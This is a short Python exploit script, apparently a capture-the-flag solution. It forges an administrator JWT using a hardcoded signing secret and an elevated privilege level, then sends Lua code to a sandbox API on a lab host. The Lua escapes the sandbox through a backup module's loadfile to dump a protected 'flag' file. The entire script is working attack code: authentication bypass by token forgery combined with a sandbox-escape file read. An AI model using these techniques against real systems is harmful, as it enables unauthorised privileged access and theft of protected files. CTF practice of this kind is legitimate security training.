import requests
import json
import jwt

token = jwt.encode(
    {
        "username" : "admin",
        "level" : 0x61646D21, 
        "exp" : 10000000000
    },
     "th1s1sjw7k3y", 
     algorithm = "HS256"
)
#print(token)

request_headers = {
    'Authorization': 'Bearer ' + token,
}

lua_code = """
loadfile = require('backup')['loadfile']
print( string.dump(loadfile('flag')) )
"""

json_data = { "code" : lua_code.replace("\n", " ") }
r = requests.post('http://192.168.20.130:37846/api/box', json=json_data, headers=request_headers)

jsonString = json.loads(r.text)
print( jsonString["message"] )